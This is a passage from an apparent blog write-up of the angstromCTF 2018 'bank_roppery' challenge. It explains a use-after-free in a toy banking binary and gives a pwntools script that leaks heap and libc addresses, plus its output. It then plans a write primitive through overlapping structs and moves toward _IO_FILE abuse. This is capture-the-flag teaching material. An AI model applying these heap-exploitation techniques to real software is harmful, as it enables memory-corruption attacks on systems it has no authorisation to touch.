@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>angstromCTF 2018 - bank_roppery | kileak</title>
+
+
+
+
+
+<meta name="description" content="angstromCTF 2018 - bank_roppery">
+
+
+<meta name="keywords" content="angstrom">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/angstrom-bank_roppery/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">angstromCTF 2018 - bank_roppery</h1>
+      <p class="post-meta">Mar 18, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>angstromCTF 2018 - bank_roppery (6 solves)
+<!--break--></p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/bank_roppery/bank_roppery">bank_roppery</a> <a href="https://kileak.github.io/assets/bank_roppery/libc.so.6">libc.so.6</a> <a href="https://kileak.github.io/assets/bank_roppery/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Welcome to GNT Holdings, the most secure bank in the world!
+You can deposit/withdraw money, write checks, and store your possessions safely
+
+Let's start by getting you logged in
+Enter username: AAAABBBB
+Enter a password: CCCCDDDD
+New user AAAABBBB created
+Welcome, AAAABBBB! Here are the commands you can use: 
+d - Deposit money in an account
+w - Withdraw money from an account
+v - View account balance
+c - Write a check for an account
+s - Store an object in a safe deposit box
+r - Retrieve an object from a safe deposit box
+e - Enumerate all the items in a safe deposit box
+p - Change the user's password
+l - Login as a different user
+h - Print this very menu
+x - Exit the program
+
+&gt; </code></pre></figure>
+
+<p>Well, this was one of the challenges on angstromCTF 2018, which kept me busy for a while (almost sure, I just overcomplicated it, but well ;-))</p>
+
+<p>It contained an obvious UAF in the <code class="language-plaintext highlighter-rouge">store_object</code> function:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">store_object</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">sdobj_t</span> <span class="o">*</span><span class="n">sdobj</span> <span class="o">=</span> <span class="p">(</span><span class="n">sdobj_t</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">sdobj_t</span><span class="p">));</span>
+
+  <span class="n">sdobj</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">read_float</span><span class="p">(</span><span class="s">"volume of the object (in cm^3)"</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">isnan</span><span class="p">(</span><span class="n">sdobj</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Invalid decimal number</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">sdobj</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">read_float</span><span class="p">(</span><span class="s">"volume of the object (in cm^3)"</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="c1">// UAF</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">sdobj</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">5000</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Object is too large</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">sdobj</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the short description: "</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">readline</span><span class="p">(</span><span class="n">sdobj</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the long description: "</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">readline</span><span class="p">(</span><span class="n">sdobj</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter who owns it: "</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">readline</span><span class="p">(</span><span class="n">sdobj</span><span class="o">-&gt;</span><span class="n">owner</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+
+  <span class="n">sdobj</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">account</span><span class="p">.</span><span class="n">sdbox</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">account</span><span class="p">.</span><span class="n">sdbox</span> <span class="o">=</span> <span class="n">sdobj</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">sdobj_t</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="n">account</span><span class="p">.</span><span class="n">sdbox</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="n">cur</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+    <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">sdobj</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">write_account</span><span class="p">();</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>But where to go from with that…</p>
+
+<p>Well, first things first, we need some leaks. For this, we just create some objects in the deposit box and then retrieve some of them to fill the unsorted bin list and their FD/BK pointers.</p>
+
+<p>We can then recreate an entry in the deposit box, but this time, we’ll specify an invalid object size, so the chunk gets freed, before we fill it.</p>
+
+<p>When <code class="language-plaintext highlighter-rouge">store_object</code> calls <code class="language-plaintext highlighter-rouge">write_account</code> after this, it will open the <code class="language-plaintext highlighter-rouge">.account</code> file and <code class="language-plaintext highlighter-rouge">fopen</code> will allocate a chunk for it’s file structure. Since our deposit chunk doesn’t match the size of the requested chunk of <code class="language-plaintext highlighter-rouge">fopen</code>, it will be put into the bin list and linked accordingly (overwriting the <code class="language-plaintext highlighter-rouge">FD</code> pointer of our chunk with the address of one of the previously freed chunks, which happens to be the <code class="language-plaintext highlighter-rouge">name</code> of our stored object).</p>
+
+<p>Thus, we can leak a heap address from the name of the last deposited entry.</p>
+
+<p>After this, we’ll store another object in the deposit box, which will then get served one of the initial freed chunks, and thus our freed chunk will get linked to <code class="language-plaintext highlighter-rouge">main_arena</code> (and we can now leak a pointer to <code class="language-plaintext highlighter-rouge">main_arena</code> via the name of this chunk).</p>
+
+<p>As a side note, since many people seemed to have trouble with the challenge on the remote machine. You couldn’t execute the <code class="language-plaintext highlighter-rouge">bank_roppery</code> binary in the folder <code class="language-plaintext highlighter-rouge">/problems/bank_roppery</code>, since it would segfault, because it wasn’t allowed to write in that folder.</p>
+
+<p>Easy solution for this, just create a symbolic link in your home directory to the binary, and it will write all its data to the home dir (where you obviously have write permissions).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"shell.angstromctf.com"</span>
+<span class="n">USER</span> <span class="o">=</span> <span class="s">"team422720"</span>
+<span class="n">PW</span> <span class="o">=</span> <span class="s">"XXXXXXXXXXXX"</span>
+
+<span class="k">def</span> <span class="nf">store</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">shortdesc</span><span class="p">,</span> <span class="n">longdesc</span><span class="p">,</span> <span class="n">owner</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"s"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">shortdesc</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">longdesc</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">owner</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">retrieve</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"r"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">enumerate</span><span class="p">():</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"e"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+
+  <span class="n">DATA</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+  <span class="k">return</span> <span class="n">DATA</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">USERNAME</span> <span class="o">=</span> <span class="s">"Z"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
+  <span class="n">PW</span> <span class="o">=</span> <span class="s">"CCCCDDDD"</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">USERNAME</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"password: "</span><span class="p">,</span> <span class="n">PW</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="s">"D"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span> 
+  
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create initial chunks"</span><span class="p">)</span>
+
+  <span class="n">store</span><span class="p">(</span><span class="s">"1000.0"</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"1"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A1"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 0
+</span>  <span class="n">store</span><span class="p">(</span><span class="s">"1000.0"</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"2"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"B1"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 1
+</span>  <span class="n">store</span><span class="p">(</span><span class="s">"1000.0"</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"3"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"C1"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 2
+</span>  <span class="n">store</span><span class="p">(</span><span class="s">"1000.0"</span><span class="p">,</span> <span class="s">"D"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"4"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"D1"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 3
+</span>  <span class="n">store</span><span class="p">(</span><span class="s">"1000.0"</span><span class="p">,</span> <span class="s">"E"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"5"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"E1"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 3
+</span>  
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Free some chunks to fill unsorted bin list"</span><span class="p">)</span>
+
+  <span class="n">retrieve</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+  <span class="n">retrieve</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+  
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create chunk (free it before filling to get a leak on FD/BK)"</span><span class="p">)</span>
+  <span class="n">store</span><span class="p">(</span><span class="s">"6000.0"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">30</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak heap address via chunk 3"</span><span class="p">)</span>
+
+  <span class="n">HEAPLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="nb">enumerate</span><span class="p">()[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">": "</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Store another chunk to get main_arena ptr into freed chunk"</span><span class="p">)</span>
+  <span class="n">store</span><span class="p">(</span><span class="s">"100.0"</span><span class="p">,</span> <span class="s">"F"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"6"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="s">"F1"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak LIBC via chunk 3"</span><span class="p">)</span>
+  <span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="nb">enumerate</span><span class="p">()[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">": "</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAPLEAK         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="p">))</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBCLEAK         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+      
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+  
+  <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./bank_roppery"</span><span class="p">)</span>
+  <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+  
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">USER</span><span class="p">,</span> <span class="n">HOST</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">PW</span><span class="p">)</span>
+    <span class="n">session</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">"rm .account"</span><span class="p">)</span>
+    <span class="n">session</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">"rm .password"</span><span class="p">)</span>
+    <span class="n">session</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">"rm -rf ZZZZZZZZ1"</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">process</span><span class="p">([</span><span class="s">"./bank_roppery"</span><span class="p">])</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm .account"</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm .password"</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm -rf ZZZZZZZZ1"</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s">"./bank_roppery"</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span><span class="s">"./libc.so.6"</span><span class="p">})</span>
+    <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">python xpl.py
+[*] '/vagrant/Challenges/angstrom/pwn/bankrop/b/bank_roppery'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/vagrant/Challenges/angstrom/pwn/bankrop/b/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './bank_roppery': pid 9216
+[9216]
+[*] Paused (press any to continue)
+[*] Create initial chunks
+[*] Free some chunks to fill unsorted bin list
+[*] Create chunk (free it before filling to get a leak on FD/BK)
+[*] Leak heap address via chunk 3
+[*] Store another chunk to get main_arena ptr into freed chunk
+[*] Leak LIBC via chunk 3
+[*] HEAPLEAK         : 0x6040a0
+[*] LIBCLEAK         : 0x7ffff7dd1c08
+[*] Switching to interactive mode</code></pre></figure>
+
+<p>So, we have the leaks, but still no useful overwrites. No pointers on the heap, which we could edit, even if we would be able to overwrite them. What a bummer…</p>
+
+<p>What could we use that UAF for, then. Well, let’s take a look, how the new objects gets inserted into our deposit list.</p>
+
+<p>It’s a single linked list, and to add an object to the list, the function <code class="language-plaintext highlighter-rouge">store_object</code> iterates over all <code class="language-plaintext highlighter-rouge">next</code> pointers, until it finds an empty one, and links our chunk there.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">account</span><span class="p">.</span><span class="n">sdbox</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">account</span><span class="p">.</span><span class="n">sdbox</span> <span class="o">=</span> <span class="n">sdobj</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+  <span class="n">sdobj_t</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="n">account</span><span class="p">.</span><span class="n">sdbox</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="n">cur</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+  <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">sdobj</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Let’s just think about the current situation in our heap.</p>
+
+<p>We currently have 4 objects linked in the <code class="language-plaintext highlighter-rouge">sdbox</code> list.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">   Name                             Owner                           
+--------------------------------------------------------------------
+0: AAAAAAAA                         A1A1A1A1A1A1A1A1                
+1: CCCCCCCC                         C1C1C1C1C1C1C1C1                
+2: EEEEEEEE                         E1E1E1E1E1E1E1E1                
+3:\x1c\xff\x7f                      BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  
+4: FFFFFFFF                         F1F1F1F1F1F1F1F1 </code></pre></figure>
+
+<p>The object <code class="language-plaintext highlighter-rouge">3</code> is in our <code class="language-plaintext highlighter-rouge">sdbox</code> list and also sits around in unsorted bin list (since it was freed before filling it), just waiting to get allocated on the next <code class="language-plaintext highlighter-rouge">malloc</code>. If we create another object now, <code class="language-plaintext highlighter-rouge">malloc</code> will serve us the address of chunk 3, which we can then overwrite. But if we just store another object there, we can only overwrite <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">owner</code>, etc. Not very useful.</p>
+
+<p>What other objects can we create?</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">date</span><span class="p">;</span>
+  <span class="kt">float</span> <span class="n">amount_num</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">paid_to</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">amount_str</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">address</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">memo</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span>
+<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">__packed__</span><span class="p">))</span> <span class="n">check_t</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">sdobj</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">desc</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">owner</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  <span class="kt">float</span> <span class="n">size</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">sdobj</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">__packed__</span><span class="p">))</span> <span class="n">sdobj_t</span><span class="p">;</span></code></pre></figure>
+
+<p>Both types are of the same size.</p>
+
+<p>If we examine both structs, you can see that the <code class="language-plaintext highlighter-rouge">memo</code> field of <code class="language-plaintext highlighter-rouge">check_t</code> is overlapping the same area, which would be covered by the <code class="language-plaintext highlighter-rouge">next</code> pointer in a <code class="language-plaintext highlighter-rouge">sdobj_t</code> object.</p>
+
+<p>Thus, if we now create a <code class="language-plaintext highlighter-rouge">check</code>, it will be created in the chunk, that is object <code class="language-plaintext highlighter-rouge">3</code> and we can overwrite the <code class="language-plaintext highlighter-rouge">next</code> pointer of chunk 3 via the <code class="language-plaintext highlighter-rouge">memo</code> field of the <code class="language-plaintext highlighter-rouge">check</code>.  On the next <code class="language-plaintext highlighter-rouge">store_object</code> it would create an object on the heap, and store the address of this object at <code class="language-plaintext highlighter-rouge">next+0x84</code> (<code class="language-plaintext highlighter-rouge">next-&gt;next</code>).</p>
+
+<p>There is only one problem with this: We cannot put an arbitrary address there. It has to point to a value of <code class="language-plaintext highlighter-rouge">0x0</code>, so <code class="language-plaintext highlighter-rouge">store_object</code> will stop iterating and write the address of the next chunk there.</p>
+
+<p>But let’s sum this up</p>
+
+<ul>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">next</code> ptr of object <code class="language-plaintext highlighter-rouge">3</code> with a <code class="language-plaintext highlighter-rouge">check</code></li>
+  <li>On the next time, we call <code class="language-plaintext highlighter-rouge">store_object</code> it will create a chunk on the heap</li>
+  <li>and store the address of this object at <code class="language-plaintext highlighter-rouge">next-&gt;next</code> of object <code class="language-plaintext highlighter-rouge">3</code> (which we overwrote with the previous <code class="language-plaintext highlighter-rouge">check</code>)</li>
+</ul>
+
+<p>Thus, we can overwrite an arbitrary address (as long as it contains <code class="language-plaintext highlighter-rouge">0x0</code>) with the address of our object.</p>
+
+<p>Most interesting pointers (<code class="language-plaintext highlighter-rouge">got</code>, <code class="language-plaintext highlighter-rouge">IO_list_all</code>, etc.) will already contain a value, so we won’t be able to use them.</p>
+
+<p>But alas, we’re dealing with <code class="language-plaintext highlighter-rouge">libc 2.23</code>, so <code class="language-plaintext highlighter-rouge">_IO_FILE</code> struct is going to help us out :)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>   <span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
+<span class="cp">#define _IO_file_flags _flags
+</span>
+  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
+  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
